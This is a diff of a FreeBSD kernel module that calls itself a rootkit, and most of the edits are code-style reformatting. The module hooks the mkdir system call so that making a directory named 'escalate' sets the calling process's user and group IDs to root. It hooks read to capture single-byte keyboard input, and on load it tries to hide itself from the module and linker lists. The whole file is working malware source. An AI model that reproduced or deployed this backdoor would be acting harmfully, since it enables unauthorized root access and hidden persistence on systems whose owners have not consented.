@@ -21,90 +21,97 @@
 static int
 load(struct module *module, int cmd, void *arg)
 {
-        switch(cmd) {
-        case MOD_LOAD:
-                LOGI("[rootkit:load] Rootkit loaded.\n");
-				toggle_hook(ON, SYS_mkdir, mkdir_hook);
-				toggle_hook(ON, SYS_read, read_hook);	
-				remove_linker_file("rootkit.ko");
-				remove_module_from_kernel("rootkit");
-				break;
-        case MOD_UNLOAD:
-				toggle_hook(OFF, SYS_mkdir, sys_mkdir);
-				toggle_hook(OFF, SYS_read, sys_read);
-                LOGI("[rootkit:load] Rootkit unloaded.\n");
-                break;
-        default:
-                LOGE("[rootkit:load] Unsupported event: {%d}.\n", cmd);
-                break;
-        }
+	switch(cmd)
+	{
+		case MOD_LOAD:
+			LOGI("[rootkit:load] Rootkit loaded.\n");
+			toggle_hook(ON, SYS_mkdir, mkdir_hook);
+			toggle_hook(ON, SYS_read, read_hook);
+			remove_linker_file("rootkit.ko");
+			remove_module_from_kernel("rootkit");
+			break;
+		case MOD_UNLOAD:
+			toggle_hook(OFF, SYS_mkdir, sys_mkdir);
+			toggle_hook(OFF, SYS_read, sys_read);
+			LOGI("[rootkit:load] Rootkit unloaded.\n");
+			break;
+		default:
+			LOGE("[rootkit:load] Unsupported event: {%d}.\n", cmd);
+			break;
+	}
 
-        return(0);
+	return(0);
 }
 
-
-int mkdir_hook(struct thread *td, void *syscall_args){
-	struct mkdir_args*uap;
+int
+mkdir_hook(struct thread *td, void *syscall_args) {
+	struct mkdir_args *uap;
 	uap = (struct mkdir_args *) syscall_args;
 
 	char path[255];
 	size_t done;
-	int error; 
+	int error;
 
 	error = copyinstr(uap->path, path, 255, &done);
 
-	if(error != 0 ){
+	if (error != 0)
+	{
 		return(error);
 	}
 
-	if(strcmp(path, "escalate") == 0){
+	if (strcmp(path, "escalate") == 0)
+	{
 		escalate_privledge(td);
 	}
 
-	printf("HOOKING\n");
 	return(sys_mkdir(td, syscall_args));
 }
 
-int read_hook(struct thread *td, void * syscall_args){
-	struct read_args * uap;
-	uap = (struct read_args *)syscall_args;
+int
+read_hook(struct thread *td, void *syscall_args)
+{
+	struct read_args *uap;
+	uap = (struct read_args *) syscall_args;
 
-	int error; 
+	int error;
 	char buf[1];
 	int done;
 
 	error = sys_read(td, syscall_args);
 
-	if(error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)){
+	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
+	{
 		return(error);
 	}
 
 	copyinstr(uap->buf, buf, 1, &done);
-
-	printf("%c\n", buf[0]);
-
 	return(error);
 }
 
-
-void toggle_hook(char * state, int sys_call_num, void*dest_func){
-	if(strcmp(state, "on")){
-		sysent[sys_call_num].sy_call = (sy_call_t*)dest_func;
+void
+toggle_hook(char *state, int sys_call_num, void *dest_func)
+{
+	if (strcmp(state, "on"))
+	{
+		sysent[sys_call_num].sy_call = (sy_call_t *) dest_func;
 		return;
 	}
-	sysent[sys_call_num].sy_call = (sy_call_t*)dest_func;
+
+	sysent[sys_call_num].sy_call = (sy_call_t *) dest_func;
 }
 
-
-int remove_module_from_kernel(char * name){
+int
+remove_module_from_kernel(char *name)
+{
 	struct module * mod;
 	int result = 1;
 	sx_xlock(&modules_sx);
-	
+
 	LOGI("Searching for %s in modules\n", name);
 	TAILQ_FOREACH(mod, &modules, link){
 		//LOGI("Checking Module: %s\n", mod->name);
-		if(strcmp(mod->name, name) == 0 ){
+		if (strcmp(mod->name, name) == 0)
+		{
 			LOGI("Found %s, Removing from modules list", mod->name);
 			//nextid--;
 			//TAILQ_REMOVE(&modules, mod, link);
@@ -118,8 +125,10 @@ int remove_module_from_kernel(char * name){
 }
 
 // Uncommented to make testing eaiser
-int remove_linker_file(char * name){
-	struct linker_file  *lf;
+int
+remove_linker_file(char *name)
+{
+	struct linker_file *lf;
 	int result = 1;
 
 	mtx_lock(&Giant);
@@ -127,9 +136,10 @@ int remove_linker_file(char * name){
 	//decrement_kernel_image_ref_count();
 
 	LOGI("Attempting to remove linker file %s\n", name);
-	TAILQ_FOREACH(lf, &linker_files, link){
+	TAILQ_FOREACH(lf, &linker_files, link) {
 		LOGI("Checking %s\n", lf->filename);
-		if(strcmp(lf->filename, name) == 0){
+		if (strcmp(lf->filename, name) == 0)
+		{
 			//next_file_id--;
 			//TAILQ_REMOVE(&linker_files,lf,link);
 			LOGI("Found and removing linker file\n");
@@ -143,11 +153,15 @@ int remove_linker_file(char * name){
 	return result;
 }
 
-void decrement_kernel_image_ref_count(void){
+void
+decrement_kernel_image_ref_count(void)
+{
 	(&linker_files)->tqh_first->refs--;
 }
 
-void escalate_privledge(struct thread * td){
+void
+escalate_privledge(struct thread * td)
+{
 	td->td_ucred->cr_uid = 0;
 	td->td_ucred->cr_ruid=0;
 	td->td_ucred->cr_svuid = 0;
@@ -155,12 +169,10 @@ void escalate_privledge(struct thread * td){
 	td->td_ucred->cr_svgid = 0;
 }
 
-
-
 static moduledata_t rootkit_mod = {
-        MODULE_NAME,
-        load,
-        NULL
+	MODULE_NAME,
+	load,
+	NULL
 };
 
 static moduledata_t mkdir_hook_mod = {
